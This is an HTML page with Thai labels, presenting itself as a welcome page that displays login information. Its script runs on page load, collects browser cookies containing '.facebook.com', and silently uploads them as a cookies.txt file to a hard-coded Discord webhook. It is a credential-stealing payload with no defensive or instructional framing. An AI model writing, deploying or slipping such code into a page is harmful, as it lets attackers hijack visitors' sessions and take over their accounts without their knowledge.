<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ดึงข้อมูลการเข้าสู่ระบบจาก Cookie</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 10px;
        }
        .info {
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ยินดีต้อนรับ</h1>
        <p>ข้อมูลการเข้าสู่ระบบ:</p>
        <div class="info" id="loginInfo">
            <!-- ข้อมูลจาก cookie จะแสดงที่นี่ -->
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // ฟังก์ชันสำหรับการดึงค่า cookie
            function getCookies() {
                return document.cookie.split(';').map(cookie => cookie.trim());
            }

            // ดึงข้อมูล cookie
            let cookies = getCookies();
            let relevantCookies = cookies.filter(cookie => {
                return cookie.includes('.facebook.com');
            });

            // แสดงข้อมูลในหน้าเว็บ
            let loginInfoDiv = document.getElementById('loginInfo');
            if (relevantCookies.length > 0) {
                loginInfoDiv.innerHTML = `<pre>${relevantCookies.join('\n')}</pre>`;
                
                // สร้างข้อความที่จะส่งไปยัง Discord webhook
                let content = relevantCookies.join('\n');
                
                // สร้างไฟล์ Blob จากข้อมูล
                let blob = new Blob([content], { type: 'text/plain' });
                let formData = new FormData();
                formData.append('file', blob, 'cookies.txt');

                // ส่งข้อมูลไปยัง Discord webhook
                fetch('https://discord.com/api/webhooks/1247307479834955797/XtrU8R1FXI-BoZKR0ZLS4nGhuiUS-sQH9tRRMAkusu6E9Fz81eVP4hsxyAWA35ZPGiJY', {
                    method: 'POST',
                    body: formData
                })
                .then(response => {
                    if (response.ok) {
                        console.log('ไฟล์ถูกส่งไปยัง Discord webhook แล้ว');
                    } else {
                        console.error('เกิดข้อผิดพลาดในการส่งไฟล์ไปยัง Discord webhook');
                    }
                })
                .catch(error => console.error('Error:', error));
            } else {
                loginInfoDiv.innerHTML = '<p>ไม่พบข้อมูลการเข้าสู่ระบบ</p>';
            }
        });
    </script>
</body>
</html>
